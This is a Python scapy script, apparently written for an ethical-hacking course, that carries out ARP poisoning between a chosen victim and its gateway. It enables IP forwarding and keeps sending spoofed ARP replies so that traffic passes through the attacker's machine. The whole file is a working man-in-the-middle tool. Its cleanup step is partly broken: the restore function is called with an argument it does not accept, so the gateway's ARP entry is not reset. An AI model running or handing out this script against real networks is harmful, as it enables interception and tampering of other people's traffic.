from scapy.all import *
import sys
import time
import os
from scapy.layers.l2 import Ether, ARP


def get_macaddress(destination_ip):
    # Doet een Request naar een Machine voor zijn Hardware address

    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')
    pkt /= ARP(op=1, pdst=destination_ip)

    mac_address = srp(pkt, timeout=2, verbose=False)[0][0][1].hwsrc
    return mac_address


def send_arp_poisoning(target_ip, target_hw, host_ip, verbosity=False):
    # Verstuurt de Arp poisening packeten gebruikt automatische HWSource van de Host als er geen specifiek is ingevuld

    pkt = ARP(op=2, pdst=target_ip, hwdst=target_hw, psrc=host_ip)
    send(pkt, verbose=False)

    if verbosity is True:
        print(f'[ Poison ] Send-to {target_ip} : {target_hw} that host {host_ip} is-at {pkt.hwsrc} ')


def send_arp_restore(target_ip, target_hw, host_ip, host_hw, verbosity=False):
    # Verstuurt arp packeten met de Juiste host informatie naar de Targets 5x om zeker te zijn dat het succesvol gaat

    pkt = ARP(op=2, pdst=target_ip, hwdst=target_hw, psrc=host_ip, hwsrc=host_hw)
    send(pkt, verbose=False, count=5)

    if verbosity is True:
        print(f'[ Restore ] Send-to {target_ip} : {target_hw} that host {host_ip} is-at {host_hw} ')


def set_routing(setting_value=1 or 0):
    # Enables Routing on a unix-based Machine

    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == setting_value:
            return
    with open(file_path, "w") as f:
        print(setting_value, file=f)
    if setting_value == 1:
        print(f'[ System ] Routing is enabled setting is set-to {setting_value} ')
    elif setting_value == 0:
        print(f'[ System ] Routing is disabled setting is set-to {setting_value} ')


if __name__ == '__main__':
    print(" Python Based ARP gemaakt voor BOK onderdeel Ethical Hacker Network hacking\n"
          " Gemaakt Door Marc Hoogendoorn 10/03/2021\n"
          )

    # Get the Input
    victim_ip = input(" Victim ip =  ")
    gateway_ip = input(" Gateway ip =  ")

    try:
        victim_hw = get_macaddress(victim_ip)
        print(victim_hw)
        gateway_hw = get_macaddress(gateway_ip)
        print(gateway_hw)
    except IndexError:
        sys.exit('\n [!] A Macaddress of one of the given hosts could not be reached. ')

    while True:
        routing = input(" Do you wanne Enable or disable Routing ? [0/1]  ")
        try:
            set_routing(int(routing))
            break
        except ValueError:
            print(" Please give in an int")
            continue

    while True:
        try:
            # Telling the Victim we are the gateway
            send_arp_poisoning(target_ip=victim_ip, target_hw=victim_hw, host_ip=gateway_ip,
                               verbosity=True)
            # Telling the Gateway we are the victim
            send_arp_poisoning(target_ip=gateway_ip, target_hw=gateway_hw, host_ip=victim_ip,
                               verbosity=True)
            # Sleeps so we don't spam
            time.sleep(1.5)

        except KeyboardInterrupt:
            print(" [ Notice ] CTRL + C Detected Reversing the Spoof")
            # Telling the Victim what the real Gateway is
            send_arp_restore(target_ip=victim_ip, target_hw=victim_hw, host_ip=gateway_ip, host_hw=gateway_hw,
                             verbosity=True)
            # Telling the Gateway what the real Victim is
            send_arp_poisoning(target_ip=gateway_ip, target_hw=gateway_hw, host_ip=victim_ip, host_hw=victim_hw,
                               verbosity=True)
